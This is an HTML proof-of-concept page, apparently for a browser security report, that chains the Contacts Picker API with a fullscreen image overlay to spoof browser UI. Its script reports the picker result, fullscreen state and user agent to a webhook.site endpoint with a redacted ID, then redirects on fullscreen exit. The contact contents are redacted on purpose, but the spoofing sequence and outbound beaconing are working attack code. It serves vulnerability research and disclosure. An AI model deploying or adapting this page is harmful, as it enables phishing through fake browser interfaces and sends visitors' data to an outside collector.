<!DOCTYPE html>
<html lang="en">
<head>
  <title>Contacts Picker → Fullscreen UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoof-ui">

<div id="content">
  <h1>Tap anywhere to start demo</h1>
</div>

<script>
/**
 * NOTE:
 * - Contact data is intentionally redacted
 * - This PoC demonstrates event sequencing + UI state confusion
 */

const WEBHOOK = "https://webhook.site/XXXXXXXX-REDACTED";

function send(event, extra = {}) {
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      timestamp: new Date().toISOString(),
      event,
      visibility: document.visibilityState,
      fullscreen: !!document.fullscreenElement,
      userAgent: navigator.userAgent,
      ...extra
    })
  }).catch(() => {});
}

// Track visibility changes
document.addEventListener("visibilitychange", () => {
  send("visibility_change");
});

document.addEventListener("click", async () => {

  // 1️⃣ User gesture → Contacts Picker
  send("contacts_picker_called", {
    requested_fields: ["name", "tel", "email"]
  });

  let granted = false;

  if (navigator.contacts && navigator.contacts.select) {
    try {
      const result = await navigator.contacts.select(
        ["name", "tel", "email"],
        { multiple: false }
      );

      if (result && result.length) {
        granted = true;

        // ⚠️ REDACTED ON PURPOSE
        send("contact_selected", {
          granted: true,
          contact_payload_shape: {
            hasName: !!result[0].name,
            hasEmail: !!result[0].email,
            hasTel: !!result[0].tel
          }
        });
      }
    } catch (e) {
      send("contacts_picker_error", {
        error: e.name
      });
    }
  } else {
    // API unsupported fallback
    granted = true;
    send("contact_selected_mock", {
      granted: true,
      note: "Contacts API not supported"
    });
  }

  send("contacts_picker_closed", { granted });

  // 2️⃣ Replace page UI
  document.getElementById("spoof").style.display = "block";
  document.getElementById("content").style.display = "none";

  // 3️⃣ Enter fullscreen after picker
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen()
      .then(() => send("entered_fullscreen"))
      .catch(() => {});
  }

}, { once: true });

// 4️⃣ Detect fullscreen exit
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    send("exited_fullscreen");

    setTimeout(() => {
      location.href = "https://google.com";
    }, 100);
  }
});
</script>

</body>
</html>
